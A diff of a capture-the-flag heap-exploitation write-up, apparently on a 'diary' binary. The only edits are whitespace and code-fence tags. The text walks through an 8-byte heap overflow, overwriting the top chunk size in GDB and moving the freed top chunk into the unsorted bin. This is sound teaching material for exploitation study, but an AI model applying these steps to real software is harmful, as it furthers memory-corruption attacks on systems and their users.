@@ -129,7 +129,7 @@ The first two points are relatively observable, while information leak is accomp
 
 ### Overflowing allocated memory
 
-Thanks to the aforementioned 8-byte overflow, attackers maybe able to manipulate the content of adjacent chunk if they allocate memory with a proper size. Beware that the first allocated chunk does not calculate the field `prev_size` into the field `size` as its `P` flag is set as 1 by default. This is to say, while allocating a block with 24 bytes, the actual size of this chunk is 0x20, which does not preserve for  `prev_size`. Let us validate that by adding a diary with the size of 24 bytes:
+Thanks to the aforementioned 8-byte overflow, attackers maybe able to manipulate the content of adjacent chunk if they allocate memory with a proper size. Beware that the first allocated chunk does not calculate the field `prev_size` into the field `size` as its `P` flag is set as 1 by default. This is to say, while allocating a block with 24 bytes, the actual size of this chunk is 0x20, which does not preserve for `prev_size`. Let us validate that by adding a diary with the size of 24 bytes:
 ```
 Please input your choice:1                                                                                                
 Please input the length of the diary content:24                                                                           
@@ -139,7 +139,7 @@ Diary addition successful.
 ```
 
 At this moment, enter into interactive mode by sending an interrupt signal (Ctrl + C or equivalent) to GDB. Type the command `heap chunks` to enable heap analysis:
-```bash
+```
 gef➤  heap chunks 
 Chunk(addr=0x5dd9313f3010, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
     [0x00005dd9313f3010     61 61 61 61 0a 00 00 00 00 00 00 00 00 00 00 00    aaaa............]
@@ -161,7 +161,7 @@ It is clear that 8-byte overflow on this chunk will cover the value of `size` fi
 
 For convenience, I modified the size of top chunk straightaway without writing a script for this moment. 
 
-```bash
+```
 gef➤  set *(0x5dd9313f3020+0x8)=0xfe1
 gef➤  x/10xg 0x00005dd9313f3010-0x10
 0x5dd9313f3000: 0x0000000000000000      0x0000000000000021
@@ -173,7 +173,7 @@ gef➤  x/10xg 0x00005dd9313f3010-0x10
 
 Turning to continued execution of the target binary, we need to allocate a new chunk of size larger than 0xfe1, which could be 0x1000, satisfying the validity checking. 
 
-```bash
+```
 gef➤  c                                                                                                          [44/1968]
 Continuing.                                                                                                               
 1                                                                                                                         
@@ -184,7 +184,7 @@ Diary addition successful.
 ```
 
 By checking the current heap bins, I found the freed top chunk has been placed on unsorted bins since the size of the Top chunk, when it is freed, is larger than the fastbin sizes and it got added to list of unsorted bins.
-```bash
+```
 gef➤  heap bins unsorted 
 ──────────────────────────────────────── Unsorted Bin for arena at 0x75f79afc4b20 ────────────────────────────────────────
 [+] unsorted_bins[0]: fw=0x5dd9313f3020, bk=0x5dd9313f3020
